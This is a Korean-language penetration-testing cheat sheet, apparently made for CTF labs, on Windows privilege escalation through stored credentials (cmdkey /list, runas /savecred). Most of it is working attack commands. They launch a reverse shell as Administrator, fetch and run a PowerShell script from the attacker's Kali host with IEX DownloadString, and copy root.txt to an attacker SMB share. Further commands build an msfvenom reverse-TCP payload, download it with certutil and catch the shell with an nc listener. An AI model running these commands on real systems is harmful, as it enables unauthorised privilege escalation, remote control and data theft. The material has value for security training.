# 09_저장된자격증명악용_runas

# 윈도우 권한상승 — 저장된 자격증명 악용 (runas /savecred)

Windows 자격증명 관리자에 저장된 자격증명을 이용해 현재 패스워드를 모르는 상태에서 다른 계정으로 명령을 실행한다. 주로 낮은 권한의 계정으로 쉘을 획득한 뒤 Administrator 자격증명이 저장되어 있는 경우 권한 상승에 활용한다.

---

## 저장된 자격증명 확인

```bash
:: 저장된 자격증명 목록 확인
:: Target에 도메인\Administrator 또는 로컬 Administrator가 있으면 악용 가능
cmdkey /list
```

출력 예시:

```
Currently stored credentials:

    Target: TERMSRV/192.168.1.1
    Type: Generic
    User: Administrator

    Target: MicrosoftAccount:target=SSO_POP_Device
    Type: Generic
    User: ...
```

---

## runas /savecred 로 명령 실행

저장된 자격증명이 있으면 패스워드 없이 해당 계정으로 명령을 실행할 수 있다.

```bash
:: 저장된 Administrator 자격증명으로 명령 실행
:: /savecred: 자격증명 관리자에 저장된 자격증명 사용
:: /user: 실행할 계정 지정
runas /savecred /user:Administrator "cmd.exe"

:: 리버스 쉘 실행
runas /savecred /user:Administrator "C:\Temp\shell.exe"

:: PowerShell로 리버스 쉘
runas /savecred /user:Administrator "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<칼리IP>/shell.ps1')"

:: 도메인 계정으로 실행
runas /savecred /user:<도메인>\Administrator "cmd.exe"  # ← 수정
```

---

## root.txt / flag 직접 읽기

```bash
:: 관리자 권한 파일 직접 읽기
runas /savecred /user:Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Temp\out.txt"
type C:\Temp\out.txt

:: 또는 칼리로 바로 전송
runas /savecred /user:Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > \\<칼리IP>\share\root.txt"
```

---

## 리버스 쉘 페이로드 준비 (칼리)

```bash
# msfvenom으로 실행 파일 생성
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=<칼리IP> LPORT=4444 \
  -f exe -o shell.exe

# 칼리에서 HTTP 서버 열기
python3 -m http.server 80

# 리스너 열기
nc -lvnp 4444
```

```bash
:: Windows에서 페이로드 다운로드
certutil -urlcache -split -f http://<칼리IP>/shell.exe C:\Temp\shell.exe

:: runas /savecred로 실행
runas /savecred /user:Administrator "C:\Temp\shell.exe"
```

---

## 흐름

```
cmdkey /list → Administrator 자격증명 확인
  → runas /savecred /user:Administrator "명령어"
  → 페이로드 실행 또는 flag 직접 읽기
```